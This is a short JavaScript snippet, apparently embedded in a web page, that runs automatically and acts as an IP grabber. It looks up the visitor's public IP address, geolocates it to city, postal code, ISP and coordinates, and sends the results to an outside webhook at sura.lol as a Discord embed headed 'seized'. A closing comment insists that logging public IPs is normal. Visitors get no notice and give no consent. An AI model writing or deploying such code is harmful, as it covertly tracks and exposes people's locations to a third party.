const sendUserInfoToDiscord = async () => {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipResponse.json();

        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const { country_name = 'Unknown', city = 'Unknown', region = 'Unknown', postal = 'Unknown', org = 'Unknown', latitude = 'Unknown', longitude = 'Unknown' } = await locationResponse.json();

        const timeCaptured = new Date().toLocaleString();

        const webhookURL = 'https://sura.lol/api/6771664d0f072';

        const discordPayload = {
            content: '👮 **User location details captured!**',
            embeds: [{
                title: 'seized',
                description: 'Below are the details of the captured user location:',
                color: 0xff0000,
                thumbnail: { url: 'https://i.pinimg.com/736x/0d/96/8e/0d968ee69c532078b43be93b9b47dd1e.jpg' },
                fields: [
                    { name: '📍 IP Address', value: `${ip}`, inline: false },
                    { name: '🌍 Country', value: `:earth_africa: ${country_name}`, inline: true },
                    { name: '🗺️ Region', value: `${region}`, inline: true },
                    { name: '🏙️ City', value: `${city}`, inline: true },
                    { name: '📮 Postal Code', value: `${postal}`, inline: true },
                    { name: '🏢 Organization', value: `${org}`, inline: false },
                    { name: '🧭 Coordinates', value: `**Latitude:** ${latitude}, **Longitude:** ${longitude}`, inline: true },
                    { name: '🕒 Time Captured', value: `${timeCaptured}`, inline: false }
                ]
            }]
        };

        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload),
        });
    } catch (error) {
        console.error('hi:', error);
    }
};
    

sendUserInfoToDiscord(); // if you're reading this it is totally normal to log public ip's !-->